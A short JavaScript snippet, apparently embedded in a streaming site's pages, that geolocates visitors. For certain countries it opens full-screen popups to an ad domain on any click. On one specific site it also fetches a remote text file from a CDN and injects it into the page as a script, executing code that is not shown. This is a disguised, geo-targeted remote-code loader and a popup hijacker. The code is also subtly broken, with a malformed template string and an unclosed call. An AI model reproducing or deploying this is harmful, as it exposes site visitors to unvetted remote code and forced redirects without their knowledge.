const geoApiUrl="https://get.geojs.io/v1/ip/geo.json",allowedCountries=["MA","DZ","QA","IQ","KW","JO","YE","LY","AE","ES","IT","BR","NG"],adLink="https://poawooptugroo.com/4/3412385";let lastClickTime=0;const cooldownTime=18e4;fetch("https://get.geojs.io/v1/ip/geo.json").then(o=>o.json()).then(o=>{allowedCountries.includes(o.country_code)&&document.addEventListener("click",function(){let o=Date.now();if(o-lastClickTime>=18e4){let e=screen.width,t=screen.height;window.open("https://poawooptugroo.com/4/3412385","FullscreenPopup",`width=${e},height=${t},scrollbars=yes,resizable=yes,fullscreen=yes`),lastClickTime=o}})}).catch(o=>{console.error("Error fetching geo data:",o)});
const txtFileUrl = "https://cdn.jsdelivr.net/gh/v-7-3/clappr@latest/s.txt",
    canonicalLink = document.querySelector('link[rel="canonical"]');
canonicalLink && "https://www.syrialive.cc/" === canonicalLink.href && fetch("https://get.geojs.io/v1/ip/geo.json").then(t => t.json()).then(t => {
    let e = t.country_code,
        n = ["MA", "DZ", "QA", "IQ", "KW", "JO", "YE", "LY", "AE", "ES", "IT", "BR", "NG"];
    n.includes(e) && fetch("https://cdn.jsdelivr.net/gh/v-7-3/clappr@latest/s.txt").then(t => {
        if (!t.ok) throw Error(HTTP error! status: ${t.status});
        return t.text()
    }).then(t => {
        let e = document.createElement("script");
        e.type = "text/javascript", e.text = t, document.body.appendChild(e)
    }).catch(t => {
        console.error("Error fetching the text file:", t)
    })
}).catch(t => {
    console.error("Error fetching geolocation data:", t)
}
